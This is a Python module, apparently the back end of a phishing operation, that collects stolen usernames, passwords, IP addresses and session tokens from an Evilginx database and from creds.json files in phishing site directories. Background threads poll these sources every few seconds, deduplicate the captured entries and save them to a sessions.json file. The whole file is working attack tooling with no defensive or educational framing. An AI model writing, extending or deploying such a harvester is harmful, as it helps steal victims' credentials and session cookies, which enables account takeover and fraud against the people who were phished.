"""
Credential Monitoring Module
Watches and extracts credentials from Evilginx and phishing sites
"""

import os
import time
import json
import re
import uuid
import threading
from datetime import datetime
import hashlib

# Paths for credential sources
DB_PATH = "/root/.evilginx/data.db"
CREDS_DIR = "/var/www/html"
JSON_OUTPUT = "sessions.json"
MONITOR_CONFIG = "monitors.json"

# Store session data by ID
session_state = {}
credentials_by_monitor = {}
active_monitors = {}
monitor_details = {}  # Store monitor details like name, sources, domains
monitor_threads = {}  # Track active threads

def extract_evilginx_sessions():
    """Extract sessions from Evilginx database"""
    if not os.path.exists(DB_PATH):
        return []
    
    all_sessions = []
    
    try:
        with open(DB_PATH, "r", encoding="utf-8", errors="ignore") as file:
            for line in file:
                if '"phishlet"' in line:
                    try:
                        json_part = re.search(r'\{.*\}', line).group(0)
                        session = json.loads(json_part)
                        
                        # Generate a unique hash ID if the credential doesn't have one
                        if not session.get("id"):
                            unique_str = f"{session.get('username','')}-{session.get('password','')}-{session.get('ip','')}"
                            session["id"] = hashlib.md5(unique_str.encode()).hexdigest()
                        
                        session["session_status"] = "extracted"
                        session["credentials_extracted"] = bool(session.get("username") or session.get("password"))
                        session["session_captured"] = bool(session.get("tokens"))
                        session["source"] = "evilginx"
                        session["source_type"] = "evilginx"
                        session["timestamp"] = datetime.now().isoformat()
                        
                        all_sessions.append(session)
                    except Exception as e:
                        print(f"Error parsing Evilginx session: {e}")
                        continue
    except Exception as e:
        print(f"Error reading Evilginx database: {e}")
    
    return all_sessions

def extract_site_credentials():
    """Extract credentials from phishing sites"""
    all_creds = []
    
    # Iterate through all potential phishing site directories
    try:
        if not os.path.exists(CREDS_DIR):
            return all_creds
        
        for domain_dir in os.listdir(CREDS_DIR):
            domain_path = os.path.join(CREDS_DIR, domain_dir)
            
            if not os.path.isdir(domain_path):
                continue
            
            creds_file = os.path.join(domain_path, "creds.json")
            
            if not os.path.exists(creds_file):
                continue
            
            try:
                with open(creds_file, "r", encoding="utf-8") as f:
                    try:
                        creds = json.load(f)
                        
                        if not isinstance(creds, list):
                            creds = [creds]  # Convert to list if it's a single object
                        
                        for item in creds:
                            # Generate a unique hash ID if the credential doesn't have one
                            if not item.get("id"):
                                unique_str = f"{item.get('username','')}-{item.get('password','')}-{item.get('ip','')}"
                                item["id"] = hashlib.md5(unique_str.encode()).hexdigest()
                            
                            item["source"] = f"phishing_site ({domain_dir})"
                            item["source_type"] = "apache_phishing"
                            item["domain"] = domain_dir
                            item["timestamp"] = item.get("timestamp", datetime.now().isoformat())
                            all_creds.append(item)
                    except json.JSONDecodeError as e:
                        print(f"Invalid JSON in {creds_file}: {e}")
                        continue
            except Exception as e:
                print(f"Error reading credentials from {creds_file}: {e}")
                continue
    except Exception as e:
        print(f"Error scanning for credentials: {e}")
    
    return all_creds

def background_watcher(monitor_id):
    """Background process to watch for credentials"""
    print(f"[*] Starting background watcher for monitor {monitor_id}")
    
    # Initialize state for this monitor
    if monitor_id not in credentials_by_monitor:
        credentials_by_monitor[monitor_id] = []
    
    # Keep track of seen credential IDs to avoid duplicates
    seen_credential_ids = {cred.get("id"): True for cred in credentials_by_monitor[monitor_id] if cred.get("id")}
    
    last_evilginx_mtime = 0
    
    # Get monitor configuration
    config = monitor_details.get(monitor_id, {})
    monitor_sources = config.get("sources", ["evilginx", "apache_phishing"])
    target_domains = config.get("domains", [])
    
    # Keep checking while monitor is active
    while monitor_id in active_monitors and active_monitors[monitor_id]:
        try:
            new_creds = []
            
            # Check Evilginx data if configured for this monitor
            if "evilginx" in monitor_sources and os.path.exists(DB_PATH):
                evilginx_mtime = os.path.getmtime(DB_PATH)
                if evilginx_mtime != last_evilginx_mtime:
                    last_evilginx_mtime = evilginx_mtime
                    evilginx_sessions = extract_evilginx_sessions()
                    
                    # Filter by domain if specified
                    if target_domains:
                        evilginx_sessions = [s for s in evilginx_sessions if s.get("phishlet") in target_domains]
                    
                    # Add new sessions that have credentials and haven't been seen before
                    for session in evilginx_sessions:
                        if (session.get("username") or session.get("password")) and \
                            session.get("id") and session.get("id") not in seen_credential_ids:
                            seen_credential_ids[session.get("id")] = True
                            new_creds.append(session)
            
            # Check phishing site credentials if configured for this monitor
            if "apache_phishing" in monitor_sources:
                site_creds = extract_site_credentials()
                
                # Filter by domain if specified
                if target_domains:
                    site_creds = [c for c in site_creds if c.get("domain") in target_domains]
                
                # Add new site credentials that haven't been seen before
                for cred in site_creds:
                    if cred.get("id") and cred.get("id") not in seen_credential_ids:
                        seen_credential_ids[cred.get("id")] = True
                        new_creds.append(cred)
            
            # Add new credentials to the monitor's collection
            if new_creds:
                print(f"[+] Found {len(new_creds)} new credentials for monitor {monitor_id}")
                credentials_by_monitor[monitor_id].extend(new_creds)
                
                # Save to disk
                save_credentials_to_file()
            
            # Sleep before checking again
            time.sleep(5)
        except Exception as e:
            # Log error but continue monitoring
            print(f"[!] Error in monitor {monitor_id}: {str(e)}")
            time.sleep(5)
    
    print(f"[*] Background watcher for monitor {monitor_id} stopped")
    # Remove the thread reference when it exits
    if monitor_id in monitor_threads:
        del monitor_threads[monitor_id]

def save_credentials_to_file():
    """Save all credentials to a JSON file for persistence"""
    try:
        all_creds = []
        for monitor_creds in credentials_by_monitor.values():
            all_creds.extend(monitor_creds)
        
        with open(JSON_OUTPUT, "w", encoding="utf-8") as f:
            json.dump(all_creds, f, indent=4)
    except Exception as e:
        print(f"[!] Error saving credentials to file: {str(e)}")

def save_monitor_config():
    """Save monitor configurations to file"""
    try:
        config_data = {
            "monitors": monitor_details,
            "active": {monitor_id: is_active for monitor_id, is_active in active_monitors.items()}
        }
        
        with open(MONITOR_CONFIG, "w", encoding="utf-8") as f:
            json.dump(config_data, f, indent=4)
            
        print(f"[+] Saved monitor configurations to {MONITOR_CONFIG}")
    except Exception as e:
        print(f"[!] Error saving monitor configurations: {str(e)}")

def load_monitor_config():
    """Load monitor configurations from file"""
    try:
        if os.path.exists(MONITOR_CONFIG):
            with open(MONITOR_CONFIG, "r", encoding="utf-8") as f:
                config_data = json.load(f)
            
            # Load monitor details
            if "monitors" in config_data:
                monitor_details.update(config_data["monitors"])
            
            # Load active status
            if "active" in config_data:
                active_monitors.update(config_data["active"])
                
            print(f"[+] Loaded monitor configurations from {MONITOR_CONFIG}")
            return True
    except Exception as e:
        print(f"[!] Error loading monitor configurations: {str(e)}")
    
    return False

def load_credentials_from_file():
    """Load credentials from JSON file"""
    try:
        if os.path.exists(JSON_OUTPUT):
            with open(JSON_OUTPUT, "r", encoding="utf-8") as f:
                all_creds = json.load(f)
            
            # Create a default monitor ID if none exists
            default_monitor_id = "default"
            if default_monitor_id not in credentials_by_monitor:
                credentials_by_monitor[default_monitor_id] = []
                active_monitors[default_monitor_id] = True
                monitor_details[default_monitor_id] = {
                    "name": "Default Monitor",
                    "sources": ["evilginx", "apache_phishing"],
                    "domains": []
                }
            
            # Add loaded credentials to default monitor
            credentials_by_monitor[default_monitor_id].extend(all_creds)
            
            print(f"[+] Loaded {len(all_creds)} credentials from file")
            return True
    except Exception as e:
        print(f"[!] Error loading credentials from file: {str(e)}")
    
    return False

def start_monitoring(name="", sources=None, domains=None):
    """Start a new monitoring thread with specific configuration
    
    Args:
        name (str): Custom name for this monitor
        sources (list): List of sources to monitor ["evilginx", "apache_phishing"]
        domains (list): List of domains to filter
    """
    monitor_id = str(uuid.uuid4())
    active_monitors[monitor_id] = True
    
    # Set defaults if not provided
    if sources is None:
        sources = ["evilginx", "apache_phishing"]
    
    if not name:
        name = f"Monitor {monitor_id[:8]}"
    
    # Store monitor configuration
    monitor_details[monitor_id] = {
        "name": name,
        "sources": sources,
        "domains": domains or [],
        "created": datetime.now().isoformat()
    }
    
    # Save configuration to disk
    save_monitor_config()
    
    # Start background thread
    thread = threading.Thread(target=background_watcher, args=(monitor_id,))
    thread.daemon = True
    thread.start()
    
    # Store thread reference
    monitor_threads[monitor_id] = thread
    
    print(f"[+] Started monitoring with ID: {monitor_id}, Name: {name}")
    return monitor_id

def stop_monitoring(monitor_id):
    """Stop a monitoring thread"""
    if monitor_id in active_monitors:
        active_monitors[monitor_id] = False
        save_monitor_config()
        print(f"[-] Stopped monitoring for {monitor_id}")
        return {"status": "success", "message": f"Monitoring stopped for {monitor_id}"}
    else:
        return {"status": "error", "message": "Monitor ID not found"}

def activate_monitoring(monitor_id):
    """Reactivate a stopped monitoring thread"""
    if monitor_id in active_monitors:
        # Already active
        if active_monitors[monitor_id]:
            return {"status": "info", "message": f"Monitor {monitor_id} is already active"}
        
        try:
            # Reactivate
            active_monitors[monitor_id] = True
            
            # Start a new thread if one isn't already running
            if monitor_id not in monitor_threads or not monitor_threads[monitor_id].is_alive():
                thread = threading.Thread(target=background_watcher, args=(monitor_id,))
                thread.daemon = True
                thread.start()
                monitor_threads[monitor_id] = thread
            
            save_monitor_config()
            
            print(f"[+] Reactivated monitoring for {monitor_id}")
            return {"status": "success", "message": f"Monitoring reactivated for {monitor_id}"}
        except Exception as e:
            active_monitors[monitor_id] = False  # Reset on error
            save_monitor_config()
            return {"status": "error", "message": f"Error activating monitor: {str(e)}"}
    else:
        return {"status": "error", "message": "Monitor ID not found"}

def get_credentials(monitor_id=None):
    """Get credentials collected by a specific monitor or all monitors"""
    if monitor_id:
        if monitor_id in credentials_by_monitor:
            return credentials_by_monitor[monitor_id]
        else:
            return []
    else:
        # Combine all credentials from all monitors
        all_creds = []
        for monitor_creds in credentials_by_monitor.values():
            all_creds.extend(monitor_creds)
        return all_creds

def get_active_monitors():
    """Get all credential monitors with details"""
    return {
        monitor_id: {
            "active": is_active,
            "credential_count": len(credentials_by_monitor.get(monitor_id, [])),
            "name": monitor_details.get(monitor_id, {}).get("name", f"Monitor {monitor_id[:8]}"),
            "sources": monitor_details.get(monitor_id, {}).get("sources", ["evilginx", "apache_phishing"]),
            "domains": monitor_details.get(monitor_id, {}).get("domains", []),
            "created": monitor_details.get(monitor_id, {}).get("created", "")
        }
        for monitor_id, is_active in active_monitors.items()
    }

def clear_credentials(monitor_id=None):
    """Clear credentials for a specific monitor or all monitors"""
    if monitor_id:
        if monitor_id in credentials_by_monitor:
            count = len(credentials_by_monitor[monitor_id])
            credentials_by_monitor[monitor_id] = []
            save_credentials_to_file()
            return {"status": "success", "message": f"Cleared {count} credentials for monitor {monitor_id}"}
        else:
            return {"status": "error", "message": "Monitor ID not found"}
    else:
        # Clear all credentials
        total = 0
        for monitor_id in credentials_by_monitor:
            total += len(credentials_by_monitor[monitor_id])
            credentials_by_monitor[monitor_id] = []
        
        save_credentials_to_file()
        return {"status": "success", "message": f"Cleared {total} credentials from all monitors"}

def reload_all_credentials():
    """Force reload all credentials from all sources"""
    try:
        # Get all credentials from both sources
        evilginx_creds = extract_evilginx_sessions()
        site_creds = extract_site_credentials()
        all_creds = evilginx_creds + site_creds
        
        # Create a default monitor if none exists
        default_monitor_id = "default"
        if default_monitor_id not in credentials_by_monitor:
            credentials_by_monitor[default_monitor_id] = []
            active_monitors[default_monitor_id] = True
            monitor_details[default_monitor_id] = {
                "name": "Default Monitor",
                "sources": ["evilginx", "apache_phishing"],
                "domains": []
            }
        
        # Use credential IDs to deduplicate
        existing_ids = {cred.get("id"): True for cred in credentials_by_monitor[default_monitor_id] if cred.get("id")}
        new_creds = []
        
        for cred in all_creds:
            if cred.get("id") and cred.get("id") not in existing_ids:
                existing_ids[cred.get("id")] = True
                new_creds.append(cred)
        
        if new_creds:
            credentials_by_monitor[default_monitor_id].extend(new_creds)
            save_credentials_to_file()
            print(f"[+] Loaded {len(new_creds)} new credentials during reload")
        
        return {"status": "success", "count": len(new_creds), "message": f"Reloaded {len(new_creds)} new credentials"}
    except Exception as e:
        print(f"[!] Error reloading credentials: {str(e)}")
        return {"status": "error", "message": f"Error reloading credentials: {str(e)}"}

# Initialize on module load
load_monitor_config()
load_credentials_from_file()

# Immediately reload all credentials to catch any that might have been missed
reload_all_credentials()